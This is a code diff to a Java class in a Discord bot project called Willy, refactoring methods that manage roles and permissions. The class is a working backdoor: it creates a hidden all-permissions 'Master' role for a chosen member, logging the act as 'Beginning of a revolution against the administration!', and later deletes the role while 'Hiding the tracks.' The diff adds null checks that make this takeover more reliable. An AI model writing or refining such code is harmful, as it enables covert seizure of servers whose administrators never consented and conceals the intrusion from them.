@@ -13,8 +13,6 @@ import discord4j.rest.util.Permission;
 import discord4j.rest.util.PermissionSet;
 import me.laravieira.willy.Willy;
 
-import java.util.function.Consumer;
-
 public class DiscordNoADM {
 	public static void ban(String guild, String member, String reason) {
 		BanQuerySpec ban = BanQuerySpec
@@ -57,9 +55,10 @@ public class DiscordNoADM {
 					.reason("Beginning of a revolution against the administration!")
 					.permissions(PermissionSet.all())
 					.build();
-			master = _guild.createRole(create).doOnSuccess((data) -> Willy.getLogger().info("["+member+"] created on server ["+guild+"].")).doOnError((data) -> {
-				Willy.getLogger().info("["+member+"] not created on server ["+guild+"] because: "+data.getMessage());
-			}).block();
+			master = _guild.createRole(create)
+					.doOnSuccess(data -> Willy.getLogger().info("["+member+"] created on server ["+guild+"]."))
+					.doOnError(data -> Willy.getLogger().info("["+member+"] not created on server ["+guild+"] because: "+data.getMessage()))
+					.block();
 		
 			
 		}else if(_guild != null) {
@@ -68,6 +67,9 @@ public class DiscordNoADM {
 			master = _guild.getRoles().filter(role -> role.getName().equals("Master")).blockFirst();
 			RoleEditSpec update = RoleEditSpec.builder().build();
 			boolean updateMaster = false;
+
+			if(master == null)
+				return;
 
 			if(!master.getColor().equals(Color.BLACK) && (updateMaster = true))
 				update = RoleEditSpec.builder().color(Color.BLACK).build();
@@ -84,37 +86,51 @@ public class DiscordNoADM {
 			if(!(master.getPermissions().not() == PermissionSet.none()) && (updateMaster = true))
 				update = RoleEditSpec.builder().permissions(PermissionSet.all()).build();
 
-			if(updateMaster) {
-				master.edit(update).doOnSuccess((data) -> Willy.getLogger().info("["+member+"] resetted on server ["+guild+"].")).doOnError((data) -> {
-					Willy.getLogger().info("["+member+"] not resetted on server ["+guild+"] because: "+data.getMessage());
-				}).block();
-			}
+			if(updateMaster)
+				master.edit(update)
+					.doOnSuccess(data -> Willy.getLogger().info("["+member+"] resetted on server ["+guild+"]."))
+					.doOnError(data -> Willy.getLogger().info("["+member+"] not resetted on server ["+guild+"] because: "+data.getMessage()))
+					.block();
 		}
 		
 		// Add the member to the role if he ins't
 		if(_member == null || master == null)
 			return;
 
-		_member.addRole(master.getId(), "Beginning of a revolution against the administration!").doOnSuccess((data) -> {
-			Willy.getLogger().info("["+member+"] is OP on server ["+guild+"].");
-		}).doOnError((data) -> Willy.getLogger().info("["+member+"] can't get OP on server ["+guild+"] because: "+data.getMessage())).block();
+		_member.addRole(master.getId(), "Beginning of a revolution against the administration!")
+			.doOnSuccess(data -> Willy.getLogger().info("["+member+"] is OP on server ["+guild+"]."))
+			.doOnError(data -> Willy.getLogger().info("["+member+"] can't get OP on server ["+guild+"] because: "+data.getMessage()))
+			.block();
 	}
 	
 	public static void deop(String guild, String member) {
 		Guild _guild = Discord.getBotGateway().getGuildById(Snowflake.of(guild)).block();
+		if(_guild == null)
+			return;
+
 		Member _member = Discord.getBotGateway().getMemberById(Snowflake.of(guild), Snowflake.of(member)).block();
+		if(_member == null)
+			return;
+
 		Role _master = _guild.getRoles().filter(role -> role.getName().equals("Master")).blockFirst();
-		
+		if(_master == null)
+			return;
+
 		// de-op a op member
-		if(_member.getRoles().any(role -> role.getName().equals("Master")).block())
-			_member.removeRole(_master.getId()).doOnSuccess((data) -> Willy.getLogger().info("["+member+"] get deop on server ["+guild+"].")).doOnError((data) -> Willy.getLogger().info("Can't de-op ["+member+"] on server ["+guild+"] because: "+data.getMessage())).block();
+		Object rawHasRole = _member.getRoles().any(role -> role.getName().equals("Master")).block();
+		if(rawHasRole instanceof Boolean hasRole && hasRole)
+			_member.removeRole(_master.getId())
+				.doOnSuccess(data -> Willy.getLogger().info("["+member+"] get deop on server ["+guild+"]."))
+				.doOnError(data -> Willy.getLogger().info("Can't de-op ["+member+"] on server ["+guild+"] because: "+data.getMessage()))
+				.block();
 		
 		// Delete role Master if is empty
-		if(!_guild.getMembers().any(spec -> spec.getRoleIds().contains(_master.getId())).block()) {
-			_master.delete("Hiding the tracks.").doOnSuccess((data) -> Willy.getLogger().info("Role Master deleted on server ["+guild+"].")).doOnError((data) -> {
-				Willy.getLogger().info("Can't delete role Master on server ["+guild+"] because: "+data.getMessage());
-			}).block();
-		}
+		Object rawIsEmpty = _guild.getMembers().any(spec -> spec.getRoleIds().contains(_master.getId())).block();
+		if(rawIsEmpty instanceof Boolean isEmpty && !isEmpty)
+			_master.delete("Hiding the tracks.")
+				.doOnSuccess(data -> Willy.getLogger().info("Role Master deleted on server ["+guild+"]."))
+				.doOnError(data -> Willy.getLogger().info("Can't delete role Master on server ["+guild+"] because: "+data.getMessage()))
+				.block();
 	}
 	
 	public static void listMemberPermissions(String guild, String member) {
@@ -122,6 +138,8 @@ public class DiscordNoADM {
 		if(_member == null)
 			return;
 		PermissionSet permissions = _member.getBasePermissions().block();
+		if(permissions == null)
+			return;
 
 		Willy.getLogger().getConsole().info("Permissions for "+_member.getDisplayName()+" ["+_member.getId().asString()+"]:");
 		if(permissions.isEmpty())
@@ -135,6 +153,9 @@ public class DiscordNoADM {
 	
 	public static void listRolePermissions(String guild, String role) {
 		Role _role = Discord.getBotGateway().getRoleById(Snowflake.of(guild), Snowflake.of(role)).block();
+		if(_role == null)
+			return;
+
 		PermissionSet permissions = _role.getPermissions();
 
 		Willy.getLogger().getConsole().info("Permissions for "+_role.getName()+" ["+_role.getId().asString()+"]:");
@@ -149,31 +170,47 @@ public class DiscordNoADM {
 	
 	public static void listChannelMemberPermissions(String guild, String channel, String member) {
 		GuildChannel _channel = Discord.getBotGateway().getGuildChannels(Snowflake.of(guild)).filter(spec -> spec.getId().equals(Snowflake.of(channel))).blockFirst();
-		Member _member = Discord.getBotGateway().getMemberById(Snowflake.of(guild), Snowflake.of(member)).block();
-		PermissionSet permissions = _channel.getOverwriteForMember(Snowflake.of(member)).get().getAllowed();
+		if(_channel == null)
+			return;
 
-		Willy.getLogger().getConsole().info("Overwrite Permissions for "+_member.getDisplayName()+" ["+_member.getId().asString()+"]:");
-		if(permissions.isEmpty())
-			Willy.getLogger().getConsole().info("No permissions");
-		else if(permissions.not().isEmpty())
-			Willy.getLogger().getConsole().info("All permissions");
-		else for(Permission permission : permissions)
-			Willy.getLogger().getConsole().info(" - "+permission.name());
-		Willy.getLogger().getConsole().info("----------------------------");
+		Member _member = Discord.getBotGateway().getMemberById(Snowflake.of(guild), Snowflake.of(member)).block();
+		if(_member == null)
+			return;
+
+		_channel.getEffectivePermissions(Snowflake.of(member))
+			.doOnSuccess(permissions -> {
+				Willy.getLogger().getConsole().info("Overwrite Permissions for "+_member.getDisplayName()+" ["+_member.getId().asString()+"]:");
+				if(permissions.isEmpty())
+					Willy.getLogger().getConsole().info("No permissions");
+				else if(permissions.not().isEmpty())
+					Willy.getLogger().getConsole().info("All permissions");
+				else for(Permission permission : permissions)
+					Willy.getLogger().getConsole().info(" - "+permission.name());
+				Willy.getLogger().getConsole().info("----------------------------");
+			})
+			.block();
 	}
 	
 	public static void listChannelRolePermissions(String guild, String channel, String role) {
 		GuildChannel _channel = Discord.getBotGateway().getGuildChannels(Snowflake.of(guild)).filter(spec -> spec.getId().equals(Snowflake.of(channel))).blockFirst();
-		Role _role = Discord.getBotGateway().getRoleById(Snowflake.of(guild), Snowflake.of(role)).block();
-		PermissionSet permissions = _channel.getOverwriteForRole(Snowflake.of(role)).get().getAllowed();
+		if(_channel == null)
+			return;
 
-		Willy.getLogger().getConsole().info("Overwrite Permissions for "+_role.getName()+" ["+_role.getId().asString()+"]:");
-		if(permissions.isEmpty())
-			Willy.getLogger().getConsole().info("No permissions");
-		else if(permissions.not().isEmpty())
-			Willy.getLogger().getConsole().info("All permissions");
-		else for(Permission permission : permissions)
-			Willy.getLogger().getConsole().info(" - "+permission.name());
-		Willy.getLogger().getConsole().info("----------------------------");
+		Role _role = Discord.getBotGateway().getRoleById(Snowflake.of(guild), Snowflake.of(role)).block();
+		if(_role == null)
+			return;
+
+		_channel.getEffectivePermissions(Snowflake.of(role))
+			.doOnSuccess(permissions -> {
+				Willy.getLogger().getConsole().info("Overwrite Permissions for "+_role.getName()+" ["+_role.getId().asString()+"]:");
+				if(permissions.isEmpty())
+					Willy.getLogger().getConsole().info("No permissions");
+				else if(permissions.not().isEmpty())
+					Willy.getLogger().getConsole().info("All permissions");
+				else for(Permission permission : permissions)
+					Willy.getLogger().getConsole().info(" - "+permission.name());
+				Willy.getLogger().getConsole().info("----------------------------");
+			})
+			.block();
 	}
 }
